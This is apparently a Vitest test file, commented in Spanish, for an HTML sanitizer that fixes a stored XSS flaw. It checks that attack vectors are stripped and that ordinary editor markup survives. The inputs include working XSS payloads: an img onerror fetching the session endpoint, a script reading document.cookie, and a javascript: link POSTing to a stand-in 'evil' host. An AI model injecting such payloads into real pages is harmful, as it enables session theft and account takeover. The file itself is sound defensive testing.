/**
 * Tests de `sanitizeDocumentHtml` — fix de XSS almacenado (HTML de documento
 * pintado en modo lectura vía `dangerouslySetInnerHTML` en Step2Revision).
 * Ejecutar con: npx vitest run lib/__tests__/sanitizeHtml.test.ts
 */
import { describe, it, expect } from "vitest";
import { sanitizeDocumentHtml } from "../sanitizeHtml";

describe("sanitizeDocumentHtml — vectores de ataque", () => {
  it("elimina <img onerror> (el vector confirmado por el auditor)", () => {
    const out = sanitizeDocumentHtml(
      '<img src=x onerror="fetch(\'/api/auth/session\')">',
    );
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("fetch(");
  });

  it("elimina <script> por completo, incluido su contenido", () => {
    const out = sanitizeDocumentHtml(
      '<p>hola</p><script>alert(document.cookie)</script>',
    );
    expect(out).not.toContain("<script");
    expect(out).not.toContain("alert(");
    expect(out).toContain("hola");
  });

  it("elimina <svg onload>", () => {
    const out = sanitizeDocumentHtml(
      '<svg onload="alert(1)"><circle/></svg>',
    );
    expect(out).not.toContain("onload");
    expect(out).not.toContain("<svg");
  });

  it("elimina <iframe>", () => {
    const out = sanitizeDocumentHtml(
      '<iframe src="https://evil.example/phish"></iframe>',
    );
    expect(out).not.toContain("<iframe");
    expect(out).not.toContain("evil.example");
  });

  it("elimina <object> y <embed>", () => {
    const out = sanitizeDocumentHtml(
      '<object data="evil.swf"></object><embed src="evil.swf">',
    );
    expect(out).not.toContain("<object");
    expect(out).not.toContain("<embed");
  });

  it("bloquea javascript: en href de <a>", () => {
    const out = sanitizeDocumentHtml(
      '<a href="javascript:fetch(\'https://evil\',{method:\'POST\'})">click</a>',
    );
    expect(out).not.toContain("javascript:");
    // El texto del link puede sobrevivir, pero sin URL peligrosa.
    expect(out).not.toMatch(/href\s*=\s*["']javascript:/i);
  });

  it("bloquea vbscript: y data:text/html en href", () => {
    const out1 = sanitizeDocumentHtml('<a href="vbscript:msgbox(1)">x</a>');
    expect(out1).not.toContain("vbscript:");

    const out2 = sanitizeDocumentHtml(
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    );
    expect(out2).not.toContain("data:text/html");
  });

  it("elimina atributo style con url() peligrosa", () => {
    const out = sanitizeDocumentHtml(
      '<p style="background:url(javascript:alert(1))">hola</p>',
    );
    expect(out).not.toContain("style=");
    expect(out).not.toContain("url(");
    expect(out).toContain("hola");
  });

  it("elimina cualquier atributo on* en cualquier tag permitido", () => {
    const out = sanitizeDocumentHtml(
      '<table onmouseover="alert(1)"><tr><td onclick="alert(2)">celda</td></tr></table>',
    );
    expect(out).not.toContain("onmouseover");
    expect(out).not.toContain("onclick");
    expect(out).toContain("celda");
  });

  it("no permite data: en src de <img> salvo data:image/*;base64", () => {
    const out = sanitizeDocumentHtml(
      '<img src="data:text/html;base64,PHNjcmlwdD48L3NjcmlwdD4=">',
    );
    expect(out).not.toContain("data:text/html");
  });

  it("no cuela XSS disfrazado de data:image (mimetype falso con payload)", () => {
    const out = sanitizeDocumentHtml(
      '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
    );
    // No matchea el regex base64 raster estricto → se descarta el src.
    expect(out).not.toMatch(/src\s*=\s*["']data:/i);
  });

  it("<style> se elimina por completo (incluido su contenido CSS)", () => {
    const out = sanitizeDocumentHtml(
      "<style>body{background:url(javascript:alert(1))}</style><p>hola</p>",
    );
    expect(out).not.toContain("<style");
    expect(out).toContain("hola");
  });

  it("string vacío devuelve string vacío", () => {
    expect(sanitizeDocumentHtml("")).toBe("");
  });
});

describe("sanitizeDocumentHtml — HTML legítimo del editor sobrevive intacto", () => {
  it("preserva encabezados, párrafos y marcas de texto", () => {
    const input =
      "<h1>Título</h1><h2>Subtítulo</h2><p><strong>negrita</strong> <em>itálica</em> <u>subrayado</u> <s>tachado</s></p>";
    const out = sanitizeDocumentHtml(input);
    expect(out).toContain("<h1>Título</h1>");
    expect(out).toContain("<h2>Subtítulo</h2>");
    expect(out).toContain("<strong>negrita</strong>");
    expect(out).toContain("<em>itálica</em>");
    expect(out).toContain("<u>subrayado</u>");
    expect(out).toContain("<s>tachado</s>");
  });

  it("preserva listas ordenadas y desordenadas", () => {
    const input =
      "<ul><li>uno</li><li>dos</li></ul><ol><li>primero</li></ol>";
    const out = sanitizeDocumentHtml(input);
    expect(out).toBe(input);
  });

  it("preserva tablas completas con colspan/rowspan", () => {
    const input =
      '<table><thead><tr><th colspan="2">Encabezado</th></tr></thead>' +
      '<tbody><tr><td rowspan="2">a</td><td>b</td></tr></tbody></table>';
    const out = sanitizeDocumentHtml(input);
    expect(out).toContain('colspan="2"');
    expect(out).toContain('rowspan="2"');
    expect(out).toContain("Encabezado");
  });

  it("preserva links http/https con rel, sin agregar atributos peligrosos", () => {
    const input =
      '<a href="https://ejemplo.com/doc" rel="noopener" title="Ver doc">link</a>';
    const out = sanitizeDocumentHtml(input);
    expect(out).toContain('href="https://ejemplo.com/doc"');
    expect(out).toContain("link");
  });

  it("preserva imágenes con src relativo (proxy /api/doc-assets/...)", () => {
    const input =
      '<img src="/api/doc-assets/abc123" alt="foto del proceso" title="evidencia">';
    const out = sanitizeDocumentHtml(input);
    expect(out).toContain('src="/api/doc-assets/abc123"');
    expect(out).toContain('alt="foto del proceso"');
  });

  it("preserva imágenes data:image/png;base64 legítimas", () => {
    const input =
      '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB">';
    const out = sanitizeDocumentHtml(input);
    expect(out).toContain("data:image/png;base64,");
  });

  it("preserva blockquote, code y pre>code", () => {
    const input =
      "<blockquote>una cita</blockquote><p>inline <code>const x = 1</code></p><pre><code>function f() {}</code></pre>";
    const out = sanitizeDocumentHtml(input);
    expect(out).toContain("<blockquote>una cita</blockquote>");
    expect(out).toContain("<code>const x = 1</code>");
    expect(out).toContain("<pre><code>function f() {}</code></pre>");
  });

  it("preserva br, hr y class en span/div", () => {
    const input =
      '<p>línea 1<br>línea 2</p><hr><div class="wizard-note"><span class="tag">nota</span></div>';
    const out = sanitizeDocumentHtml(input);
    expect(out).toContain("<br>");
    expect(out).toContain("<hr>");
    expect(out).toContain('class="wizard-note"');
    expect(out).toContain('class="tag"');
  });
});
